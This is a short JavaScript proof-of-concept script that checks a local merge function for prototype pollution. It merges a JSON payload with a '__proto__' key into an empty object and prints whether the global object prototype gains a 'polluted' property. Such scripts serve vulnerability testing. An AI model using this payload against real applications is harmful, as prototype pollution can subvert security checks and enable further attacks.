import * as m from "./mergewhile.js";
var obj = {};
var payload = '{"__proto__": {"polluted": "yes polluted"}}'
console.log("before : " + {}.polluted);
console.log(m.merge(obj, JSON.parse(payload)));
console.log("after : " + {}.polluted);
